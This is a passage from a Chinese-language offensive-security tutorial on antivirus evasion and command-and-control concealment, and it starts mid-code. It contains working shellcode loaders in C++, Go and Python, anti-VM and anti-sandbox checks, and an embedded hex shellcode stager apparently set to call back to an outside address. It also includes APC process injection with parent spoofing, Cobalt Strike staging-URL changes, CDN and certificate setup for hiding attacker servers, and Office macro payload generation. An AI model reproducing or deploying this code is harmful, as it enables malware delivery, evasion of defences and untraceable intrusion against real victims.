		void* exec = VirtualAlloc(0, cVmResv, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		memcpy(exec, sc, rest2_decoded.length());

	
		HANDLE hThread{ nullptr };
		ANtCTE(
			&hThread,
			THREAD_ALL_ACCESS,
			NULL,
			GetCurrentProcess(),
			(LPTHREAD_START_ROUTINE)exec,
			NULL,
			NULL,
			0,
			0,
			0,
			nullptr
		);
		WaitForSingleObject(hThread, INFINITE);

	}
}
~~~

替换rest2_reference处的shellcode为自己的

编译运行...



### 高级绕过

~~~
反vt
反调试
反虚拟机
~~~

~~~
静态扫描：md5-hash特征码
动态扫描：虚拟机，vt，行为检测
反编译调试：逆出源码或者观察行为
~~~

https://www.freebuf.com/articles/web/202717.html

#### 1-反虚拟机

~~~
检测内容可以看如上
~~~

###### 检测代码-go

~~~go
package main

import (
	"encoding/hex"
	"golang.org/x/sys/windows"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// 检测语言，依赖windows数据包，编译后会增加0.6M大小
func check_language() {
	a, _ := windows.GetUserPreferredUILanguages(windows.MUI_LANGUAGE_NAME) //获取当前系统首选语言
	if a[0] != "zh-CN" {
		os.Exit(1)
	}
}

func check_sandbox() {
	// 1. 延时运行
	timeSleep1, _ := timeSleep()
	// 2. 检测开机时间
	bootTime1, _ := bootTime()
	// 3. 检测物理内存
	physicalMemory1, _ := physicalMemory()
	// 4. 检测CPU核心数
	numberOfCPU1, _ := numberOfCPU()
	// 5. 检测临时文件数
	numberOfTempFiles1, _ := numberOfTempFiles()
	level := timeSleep1 + bootTime1 + physicalMemory1 + numberOfCPU1 + numberOfTempFiles1 // 有五个等级，等级越趋向于5，越像真机
	//fmt.Println("level:", level)
	if level < 4 {
		os.Exit(1)
	}
}

// 1. 延时运行
func timeSleep() (int, error) {
	startTime := time.Now()
	time.Sleep(5 * time.Second)
	endTime := time.Now()
	sleepTime := endTime.Sub(startTime)
	if sleepTime >= time.Duration(5*time.Second) {
		//fmt.Println("睡眠时间为:", sleepTime)
		return 1, nil
	} else {
		return 0, nil
	}
}

// 2. 检测开机时间
// 许多沙箱检测完毕后会重置系统，我们可以检测开机时间来判断是否为真实的运行状况。
func bootTime() (int, error) {
	var kernel = syscall.NewLazyDLL("Kernel32.dll")
	GetTickCount := kernel.NewProc("GetTickCount")
	r, _, _ := GetTickCount.Call()
	if r == 0 {
		return 0, nil
	}
	ms := time.Duration(r * 1000 * 1000)
	tm := time.Duration(30 * time.Minute)
	//fmt.Println(ms,tm)
	if ms < tm {
		return 0, nil
	} else {
		return 1, nil
	}

}

// 3、物理内存大小
func physicalMemory() (int, error) {
	var mod = syscall.NewLazyDLL("kernel32.dll")
	var proc = mod.NewProc("GetPhysicallyInstalledSystemMemory")
	var mem uint64
	proc.Call(uintptr(unsafe.Pointer(&mem)))
	mem = mem / 1048576
	//fmt.Printf("物理内存为%dG\n", mem)
	if mem < 4 {
		return 0, nil // 小于4GB返回0
	}
	return 1, nil // 大于4GB返回1
}

func numberOfCPU() (int, error) {
	a := runtime.NumCPU()
	//fmt.Println("CPU核心数为:", a)
	if a < 4 {
		return 0, nil // 小于4核心数,返回0
	} else {
		return 1, nil // 大于4核心数，返回1
	}
}
func numberOfTempFiles() (int, error) {
	conn := os.Getenv("temp") // 通过环境变量读取temp文件夹路径
	var k int
	if conn == "" {
		//fmt.Println("未找到temp文件夹，或temp文件夹不存在")
		return 0, nil
	} else {
		local_dir := conn
		err := filepath.Walk(local_dir, func(filename string, fi os.FileInfo, err error) error {
			if fi.IsDir() {
				return nil
			}
			k++
			// fmt.Println("filename:", filename)  // 输出文件名字
			return nil
		})
		//fmt.Println("Temp总共文件数量:", k)
		if err != nil {
			// fmt.Println("路径获取错误")
			return 0, nil
		}
	}
	if k < 30 {
		return 0, nil
	}
	return 1, nil
}

func check_virtual() (bool, error) { // 识别虚拟机
	model := ""
	var cmd *exec.Cmd
	cmd = exec.Command("cmd", "/C", "wmic path Win32_ComputerSystem get Model")
	stdout, err := cmd.Output()
	if err != nil {
		return false, err
	}
	model = strings.ToLower(string(stdout))
	if strings.Contains(model, "VirtualBox") || strings.Contains(model, "virtual") || strings.Contains(model, "VMware") ||
		strings.Contains(model, "KVM") || strings.Contains(model, "Bochs") || strings.Contains(model, "HVM domU") || strings.Contains(model, "Parallels") {
		return true, nil //如果是虚拟机则返回true
	}
	return false, nil
}
func PathExists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}
func fack(path string) {
	b, _ := PathExists(path)
	if b {
		os.Exit(1)
	}
}
func check_file() {
	fack("C:\\windows\\System32\\Drivers\\Vmmouse.sys")
	fack("C:\\windows\\System32\\Drivers\\vmtray.dll")
	fack("C:\\windows\\System32\\Drivers\\VMToolsHook.dll")
	fack("C:\\windows\\System32\\Drivers\\vmmousever.dll")
	fack("C:\\windows\\System32\\Drivers\\vmhgfs.dll")
	fack("C:\\windows\\System32\\Drivers\\vmGuestLib.dll")
	fack("C:\\windows\\System32\\Drivers\\VBoxMouse.sys")
	fack("C:\\windows\\System32\\Drivers\\VBoxGuest.sys")
	fack("C:\\windows\\System32\\Drivers\\VBoxSF.sys")
	fack("C:\\windows\\System32\\Drivers\\VBoxVideo.sys")
	fack("C:\\windows\\System32\\vboxdisp.dll")
	fack("C:\\windows\\System32\\vboxhook.dll")
	fack("C:\\windows\\System32\\vboxoglerrorspu.dll")
	fack("C:\\windows\\System32\\vboxoglpassthroughspu.dll")
	fack("C:\\windows\\System32\\vboxservice.exe")
	fack("C:\\windows\\System32\\vboxtray.exe")
	fack("C:\\windows\\System32\\VBoxControl.exe")
}

var VirtualAlloc = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func aaa(a unsafe.Pointer, b uintptr, c uint32, d unsafe.Pointer) bool {
	ret, _, _ := VirtualAlloc.Call(
		uintptr(a),
		uintptr(b),
		uintptr(c),
		uintptr(d))
	return ret > 0
}

func Run(sc []byte) {
	fly := func() {}
	var xx uint32
	if !aaa(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&fly))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&xx)) {
	}
	**(**uintptr)(unsafe.Pointer(&fly)) = *(*uintptr)(unsafe.Pointer(&sc))
	var yy uint32
	aaa(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&yy))
	fly()
}

func ScFromHex(scHex string) []byte {
	var charcode []byte
	charcode, _ = hex.DecodeString(string(scHex))
	return charcode
}
func main() {
	check_language()
	check_file()
	check, _ := check_virtual()
	if check == true {
		os.Exit(1)
	}
	check_sandbox()
	sccode := ScFromHex("fc4883e4f0e8cc000000415141505251564831d265488b5260488b5218488b5220488b72504d31c9480fb74a4a4831c0ac3c617c022c2041c1c90d4101c1e2ed52488b522041518b423c4801d0668178180b020f85720000008b80880000004885c074674801d0448b40208b48184901d050e3564d31c948ffc9418b34884801d64831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc02001a202f5eec7541544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5")
	Run(sccode)
}

~~~



###### 检测代码-python

~~~~python
import ctypes,base64,os,psutil,time
from multiprocessing import cpu_count


def check_file():
    vmfile=[
        'C:\windows\System32\Drivers\Vmmouse.sys',
        'C:\windows\System32\Drivers/vmtray.dll',
        'C:\windows\System32\Drivers\VMToolsHook.dll',
        'C:\windows\System32\Drivers/vmmousever.dll',
        'C:\windows\System32\Drivers/vmhgfs.dll',
        'C:\windows\System32\Drivers/vmGuestLib.dll',
        'C:\windows\System32\Drivers\VBoxMouse.sys',
        'C:\windows\System32\Drivers\VBoxGuest.sys',
        'C:\windows\System32\Drivers\VBoxSF.sys',
        'C:\windows\System32\Drivers\VBoxVideo.sys',
        'C:\windows\System32/vboxdisp.dll',
        'C:\windows\System32/vboxhook.dll',
        'C:\windows\System32/vboxoglerrorspu.dll',
        'C:\windows\System32/vboxoglpassthroughspu.dll',
        'C:\windows\System32/vboxservice.exe',
        'C:\windows\System32/vboxtray.exe',
        'C:\windows\System32\VBoxControl.exe',
    ]
    for data in vmfile:
        result=os.path.exists(data)
        if result:
            return 0
    return 1



def check_virtual():
    r=os.popen('wmic path Win32_ComputerSystem get Model')
    text = r.read()
    if 'vmware' in text:
        return 0
    return 1

def numberOfCPU():
    if int(format(cpu_count())) < 4:
        return 0
    return 1

def physicalMemory():
    data = psutil.virtual_memory()
    total = data.total  # 总内存,单位为byte
    n=int(total/1024/1024/1024)+1
    if n < 4:
        return 0
    return 1

if __name__ == '__main__':
    r=numberOfCPU()+physicalMemory()+check_virtual()+check_file()
    print(r)
    if r < 4:
        exit()
    else:
        buf = b'/EiD5PDoyAAAAEFRQVBSUVZ'
        shellcode = base64.b64decode(buf)
        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
        rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode),len(shellcode))
        handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
        ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
~~~~

利用c代码判断是否是虚拟机或者沙盒

~~~
\反沙盒VT\C++-CheckVM-Sandbox-master\CheckVM-Sandbox-master
~~~

##### 反沙箱

https://forum.butian.net/share/758







#### APC进程注入



~~~c++
// Parent spoofing.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <windows.h>
#include <TlHelp32.h>

DWORD getParentProcessID()
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process))
    {
        do
        {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
            {
                printf("Find explorer failed!\n");
                break;
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main()
{
    unsigned char shellCode[] = "\xfc\x48";

    STARTUPINFOEXA sInfoEX;
    PROCESS_INFORMATION pInfo;
    SIZE_T sizeT;

    //打开explorer进程获取当前进程所有权限
    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID());

    //用0填充数组
    ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA));

    //初始化指定的属性列表,创建进程和线程
    InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);

    //设置进程属性并从堆中分配内存
    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);

    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT);

    //更新用于进程和线程创建的属性列表中的指定属性
    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);

    sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA("C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        reinterpret_cast<LPSTARTUPINFOA>(&sInfoEX),
        &pInfo);

    //分配内存
    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    SIZE_T* lpNumberOfBytesWritten = 0;

    //写入内存
    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten);

    //APC调用
    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);

    //启动线程
    ResumeThread(pInfo.hThread);
    CloseHandle(pInfo.hThread);

    return 0;
}
~~~

将shellcode注入到notepad.exe中

[![pp7TMNt.png](https://s1.ax1x.com/2023/04/08/pp7TMNt.png)](https://imgse.com/i/pp7TMNt)



#### 反调试

~~~
https://mp.weixin.qq.com/s?__biz=Mzg3Mzg1OTYyMQ==&mid=2247486058&idx=1&sn=2af8853e3e8437044e76e898c250ab78&source=41#wechat_redirect
~~~

例如我们采用其中的第四种反调试

[![pp7TdNq.png](https://s1.ax1x.com/2023/04/08/pp7TdNq.png)](https://imgse.com/i/pp7TdNq)







#### 二开CS去除特征

~~~
目标进行上线时，会访问一个特殊地址(例如我们的公网CS地址是：124.70.20.10)，会访问http://124.70.20.10/xXBd/，后面四位是字母组合，根据一个checksum8算法
如果你的是32位则是，92
64位则是93
~~~

~~~java
public class EchoTest{
	public static long checksum8(String text){
		if(text.length() < 4){
			return 0L;
		}
		text = text.replace("/","");
		long sum = 0L;
		for (int i=0;i<text.length();i++){
			sum += text.charAt(i);
		}
		return sum % 256;
	}
	
	public static void main(String[] args) throws Exception{
		System.out.println(checksum8("F5vk"));
	}
	

}
~~~

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/106931/12/27390/27527/647f3756F361acb3e/ae79d40da1493a6b.jpg)









### 防溯源

~~~
CDN节点-防拉黑
SSL特征-防特征
OSS存储-防流量
~~~



#### CDN节点

在https://www.godaddy.com/en-sg上买一个域名

然后在cloudflare上添加域名

[![ppLIWod.png](https://s1.ax1x.com/2023/04/11/ppLIWod.png)](https://imgse.com/i/ppLIWod)

[![ppLIjFs.png](https://s1.ax1x.com/2023/04/11/ppLIjFs.png)](https://imgse.com/i/ppLIjFs)



在godaddy上增加dns服务器为cloudflare的dns服务器

[![ppLIxWq.png](https://s1.ax1x.com/2023/04/11/ppLIxWq.png)](https://imgse.com/i/ppLIxWq)

在这里开启这两个

[![ppLoZf1.png](https://s1.ax1x.com/2023/04/11/ppLoZf1.png)](https://imgse.com/i/ppLoZf1)

最后一定要点击"检查名称服务器"

成功之后我们在https://ping.chinaz.com/，测试我们的域名是否配置了CDN

[![ppLTg5d.png](https://s1.ax1x.com/2023/04/11/ppLTg5d.png)](https://imgse.com/i/ppLTg5d)

我的服务器是129.226.92.29，这里只有两个是真实的（新加坡腾讯云），其他的是CDN

可以ping通后，在https://github.com/threatexpress/malleable-c2，找到对应cs版本的模板

比如我的是4.7[![ppLTIr8.png](https://s1.ax1x.com/2023/04/11/ppLTIr8.png)](https://imgse.com/i/ppLTIr8)

保存下来，修改里面的http-get和http-post，例如

[![ppL7SqU.png](https://s1.ax1x.com/2023/04/11/ppL7SqU.png)](https://imgse.com/i/ppL7SqU)[![ppL79ZF.png](https://s1.ax1x.com/2023/04/11/ppL79ZF.png)](https://imgse.com/i/ppL79ZF)

这里设置好后，保存放在服务器上执行(名字可以修改)

~~~
./teamserver 129.226.92.29 password 4.7config.profile
~~~

启动成功后配置http和https的监听器，然后生成payload stageless exe

[![ppL7ZM6.png](https://s1.ax1x.com/2023/04/11/ppL7ZM6.png)](https://imgse.com/i/ppL7ZM6)[![ppL71JA.png](https://s1.ax1x.com/2023/04/11/ppL71JA.png)](https://imgse.com/i/ppL71JA)

这里的端口必须是特制的

~~~
http:   80.8080.8880.2052.2082.2086.2095
https:   443.2053.2083.2087.2096.8443
~~~

然后生成exe，必须在本地ping通之后才可能上线

[![ppL7tL8.png](https://s1.ax1x.com/2023/04/11/ppL7tL8.png)](https://imgse.com/i/ppL7tL8)

运行exe，用tcpview查看通信端口，发现是CDN

[![ppL76yV.png](https://s1.ax1x.com/2023/04/11/ppL76yV.png)](https://imgse.com/i/ppL76yV)



#### SSL证书

1.创建证书（SSL-源服务器）

[![ppLHSSI.png](https://s1.ax1x.com/2023/04/11/ppLHSSI.png)](https://imgse.com/i/ppLHSSI)[![ppLHplt.png](https://s1.ax1x.com/2023/04/11/ppLHplt.png)](https://imgse.com/i/ppLHplt)

把源证书和私钥保存为server.pem和server.key

[![ppLHCOf.png](https://s1.ax1x.com/2023/04/11/ppLHCOf.png)](https://imgse.com/i/ppLHCOf)

2.生成证书文件

设置页面规则

[![ppLH8k4.png](https://s1.ax1x.com/2023/04/11/ppLH8k4.png)](https://imgse.com/i/ppLH8k4)

保存CSR&密钥（server.pem&server.key）

上传我们的server.pem&server.key





~~~
openssl pkcs12 -export -in server.pem -inkey server.key -out www.shazambatman.xyz.p12 -name www.shazambatman.xyz -passout pass:123456

keytool -importkeystore -deskstorepass 123456 -deskkeypass 123456 -deskkeystore www.shazambatman.xyz.store -srckeystore www.shazambatman.xyz.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias www.shazambatman.xyz
~~~



打开teamserver

[![ppLb3KP.png](https://s1.ax1x.com/2023/04/11/ppLb3KP.png)](https://imgse.com/i/ppLb3KP)[![ppLb8Df.png](https://s1.ax1x.com/2023/04/11/ppLb8Df.png)](https://imgse.com/i/ppLb8Df)

再把这个替换到服务器重启就生效了



#### OSS存储

https://oss.console.aliyun.com/bucket/oss-cn-beijing/batmanfuture/object

上传文件





### Office套件

https://github.com/outflanknl/EvilClippy

~~~
"C:\Program Files (x86)\Microsoft Visual Studio\Shared\Packages\Microsoft.CodeDom.Providers.DotNetCompilerPlatform.2.0.1\tools\Roslyn45\csc.exe" /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs
~~~

[![ppOEDQP.png](https://s1.ax1x.com/2023/04/11/ppOEDQP.png)](https://imgse.com/i/ppOEDQP)



1.vba

~~~vb
Sub Hello()
Dim X
X-MsgBox("Hello VBS")
~~~



~~~
BadAssMacrosx64.exe -i payload.bin -w doc -p no -e classic -c 5 -o 1.vba
~~~

[![ppOn9gA.png](https://s1.ax1x.com/2023/04/11/ppOn9gA.png)](https://imgse.com/i/ppOn9gA)





















